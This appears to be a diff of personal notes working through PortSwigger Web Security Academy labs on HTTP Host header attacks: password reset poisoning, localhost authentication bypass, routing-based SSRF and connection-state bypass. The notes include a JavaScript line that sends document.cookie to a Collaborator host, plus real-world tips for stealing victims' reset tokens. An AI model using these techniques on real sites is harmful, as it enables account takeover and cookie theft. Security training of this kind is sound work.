@@ -1,6 +1,6 @@
-## Stage 1 + 2
+### Stage 1 + 2
 
-![375](Host%20Headers-20251014223505164.png)
+![[Host Headers-20251014223505164.png|375]]
 
 Expose web apps to vulnerabilities via HTTP host header attacks via misconfigurations. If the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behavior. Aka "Host header injection" attacks.
 ### What is it?
@@ -55,17 +55,17 @@ X-Forwarded-Server: EXPLOIT.net
 		2. `username=carlos`
 		3. Check access log for password reset token
 		4. If `Host` doesn't work, try the 3 `X` headers above
-			1. [Host Headers](Host%20Headers.md#1.1%20Lab%20Basic%20password%20reset%20poisoning%20%E2%AD%95%EF%B8%8F)
+			1. [[Host Headers#1.1 Lab Basic password reset poisoning ⭕️]]
 		5. --
 		6. "Admin interface only available to local users" (Stage 2?)
 			1. **Solution**: set `Host: localhost`
-				1. [Host Headers](Host%20Headers.md#1.2.%20Lab%20Host%20header%20authentication%20bypass%20%E2%AD%95%EF%B8%8F)
+				1. [[Host Headers#1.2. Lab Host header authentication bypass ⭕️]]
 	- 421 Misdirected Request
-		- [Host Headers](Host%20Headers.md#1.11%20Lab%20Password%20reset%20poisoning%20via%20middleware%20%E2%AD%95%EF%B8%8F)
+		- [[Host Headers#1.11 Lab Password reset poisoning via middleware ⭕️]]
 	- AND `GET /admin` == 301 Moved Permanently
-		- [Host Headers](Host%20Headers.md#1.6.%20Lab%20Host%20validation%20bypass%20via%20connection%20state%20attack%20%E2%AD%95%EF%B8%8F)
+		- [[Host Headers#1.6. Lab Host validation bypass via connection state attack ⭕️]]
 	- 403 Forbidden or add another Host headers + got 200 OK + 2nd host reflected in response
-		- [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.x.%20Lab%20Web%20cache%20poisoning%20via%20ambiguous%20requests%20%E2%AD%95%EF%B8%8F)
+		- [[Web Cache Poisoning#1.x. Lab Web cache poisoning via ambiguous requests ⭕️]]
 Lab: Web cache poisoning via ambiguous requests
 Send victim cookie to burp collaborator
 ```
@@ -76,10 +76,10 @@ fetch(`https://collaborator.net/x`+document.cookie);
 
 - `Host` to burp collaborator == got DNS + HTTP callback
 	- **Solution:** Intruder `Host: 192.168.0.$0$`
-		- [Host Headers](Host%20Headers.md#1.4.%20Lab%20Routing-based%20SSRF%20%E2%AD%95%EF%B8%8F)
+		- [[Host Headers#1.4. Lab Routing-based SSRF ⭕️]]
 
 - Set the following == 504 Gateway Timeout
-	- [SSRF](SSRF.md#1.x.%20Lab%20SSRF%20via%20flawed%20request%20parsing%20%E2%AD%95%EF%B8%8F)
+	- [[SSRF#1.x. Lab SSRF via flawed request parsing ⭕️]]
 ```
 GET https://YOUR-LAB-ID.web-security-academy.net/
 Host: YOUR_LAB_ID-hacker.web-security-academy.net
@@ -93,19 +93,19 @@ Host: YOUR_LAB_ID-hacker.web-security-academy.net
 This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account.
 
 1. Grab the POST request that initiate a password reset and replace the `Host` header with an arbitrary domain -- success
-![454](Host%20Headers-20251014231857447.png)
+![[Host Headers-20251014231857447.png|454]]
 
 2. In your email client, you will see a link with the arbitrary domain
-![Host Headers-20251014232021642](Host%20Headers-20251014232021642.png)
+![[Host Headers-20251014232021642.png]]
 
 3. In the same request as Step 1, change the `Host` header to your exploit server's domain and change the `username` body parameter to carlos
-![Host Headers-20251014232343559](Host%20Headers-20251014232343559.png)
+![[Host Headers-20251014232343559.png]]
 
 4. In your exploit server access log, you'll see a `temp-forgot-password-token` and this one belongs to carlos -- copy it
-![Host Headers-20251014232633316](Host%20Headers-20251014232633316.png)
+![[Host Headers-20251014232633316.png]]
 
 5. Get a forgot password POST request and replace that `temp-forgot-password-token` with carlos's and it will change his password -- login and solved
-![Host Headers-20251014233013612](Host%20Headers-20251014233013612.png)
+![[Host Headers-20251014233013612.png]]
 >[!tip] Real World Example
 >So, in a real world scenario:
 >1. we set the `Host` header to a server an attacker controls and set the `username` parameter to the victim's username
@@ -124,19 +124,19 @@ This lab is vulnerable to password reset poisoning. The user `carlos` will car
 This lab makes an assumption about the privilege level of the user based on the HTTP Host header. To solve the lab, access the admin panel and delete the user `carlos`.
 
 1. Sending an arbitrary domain will still yield a 200 OK
-![Host Headers-20251015204655714](Host%20Headers-20251015204655714.png)
+![[Host Headers-20251015204655714.png]]
 
 2. Go to `/robots.txt` to find `/admin` is disallowed
-![Host Headers-20251015204303222](Host%20Headers-20251015204303222.png)
+![[Host Headers-20251015204303222.png]]
 
 3. says the admin panel is only for **local users**
-![Host Headers-20251015204542762](Host%20Headers-20251015204542762.png)
+![[Host Headers-20251015204542762.png]]
 
 4. Step 3 gives the hint about who can access admin so put `Host: localhost`
-![Host Headers-20251015204851098](Host%20Headers-20251015204851098.png)
+![[Host Headers-20251015204851098.png]]
 
 5. Send the request to the browser, delete carlos, copy the URL and put that back to the request in Repeater
-![Host Headers-20251015205001101](Host%20Headers-20251015205001101.png)
+![[Host Headers-20251015205001101.png]]
 
 >[!tip] Real World Example
 >Want to access a page or feature that is only available for admins. So change the `Host` header to something like `admin.whatever.com` and hope to access it.
@@ -148,17 +148,17 @@ This lab is vulnerable to routing-based SSRF via the Host header. You can exploi
 To solve the lab, access the internal admin panel located in the `192.168.0.0/24` range, then delete the user `carlos`.
 
 1. right click > insert collaborator payload on the `Host` header and got a 200 OK
-![408](Host%20Headers-20251015210423764.png)
+![[Host Headers-20251015210423764.png|408]]
 
 2. Go to the Collaborator tab and we have an HTTP request
-![428](Host%20Headers-20251015210506080.png)
+![[Host Headers-20251015210506080.png|428]]
 
 3. Go to `/admin` and send that request to Intruder and make sure it has all of these settings. Since the admin panel is located in one of the IPs in a specific range, we're going to enumerate to find it.
-![Host Headers-20251015211036660](Host%20Headers-20251015211036660.png)
+![[Host Headers-20251015211036660.png]]
 
 4. One of the results `192.168.0.245` will show a 200 OK then send that request to the browser and type `carlos` then delete
 5. Go to HTTP history, grab that POST request, send to Repeater, replace `Host` with `192.168.0.245` then send
-![464](Host%20Headers-20251015211434438.png)
+![[Host Headers-20251015211434438.png|464]]
 >[!info] Difference Between SSRF and the Previous Authentication Lab
 >This one uses an internal IP in the `Host` header and SSRF requires a server to open/route a connection (HTTP) to a target. Hence, why Collaborator was used. The previous lab's server checks the `Host` header if the subdomain is admin or not.
 
@@ -172,16 +172,16 @@ To solve the lab, exploit this behavior to access an internal admin panel locate
 >Setting `Host: example.com` will also get you a 301
 
 1. Send a GET request to Repeater, change the path to `/admin` and `Host: 192.168.0.1`. We got a 301 and directed back to the homepage.
-![512](Host%20Headers-20251015213903205.png)
+![[Host Headers-20251015213903205.png|512]]
 
 2. Duplicate the request, add it to the same group, change the 1st request back to `/` and the `Host` header to the original `...h1-web-security-academy.net`. Set `Connection` to `keep-alive`. Select Send group in a sequence (single connection) next to the Send button.
-![269](Host%20Headers-20251015213815123.png)
+![[Host Headers-20251015213815123.png|269]]
 
 3. Check the `/admin` request and we have a 200 OK. Right click on the response, `Show response in browser`, type carlos and Delete.
-![411](Host%20Headers-20251015213847595.png)
+![[Host Headers-20251015213847595.png|411]]
 
 4. In HTTP History, copy the path `/admin/delete` and the body parameters `csrf` and `username` and paste it to the 2nd request. Send and solved.
-![444](Host%20Headers-20251015214601776.png)
+![[Host Headers-20251015214601776.png|444]]
 >[!tip] Understanding Connection State Attacks
 >If a server caches connection state, an attacker could *plant* a Host value and have later request inherit the connection state. This will bypass `Host` header validation. 
 >
@@ -195,19 +195,19 @@ To solve the lab, exploit this behavior to access an internal admin panel locate
 This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.
 
 1. Use the Forgot Password feature and check the email client. See there's an email link to reset the account's password.
-![421](Host%20Headers-20251015222023753.png)
+![[Host Headers-20251015222023753.png|421]]
 
 2. Send the POST `/forgot-password` feature to Repeater. Add the `X-Forwarded-Host` header with an arbitrary domain. 200 OK means that header is supported.
-![Host Headers-20251015221452601](Host%20Headers-20251015221452601.png)
+![[Host Headers-20251015221452601.png]]
 
 3. Change `X-Forwarded-Host` to the exploit server and `username` to carlos.
-![441](Host%20Headers-20251015221743093.png)
+![[Host Headers-20251015221743093.png|441]]
 
 4. Check the access log and we will have carlos's password reset token.
-![Host Headers-20251015221833577](Host%20Headers-20251015221833577.png)
+![[Host Headers-20251015221833577.png]]
 
 5. Copy the password reset link from Step 1 and replace the token with carlos's then change the password. Sign in as carlos and solved.
-![426](Host%20Headers-20251015222134408.png)
+![[Host Headers-20251015222134408.png|426]]
 >[!tip] Middleware Attacks?
 >Middleware/Backend components caches a Host from an earlier request when building password reset links. Generated password reset links will be sent to an attacker's domain. 
 >
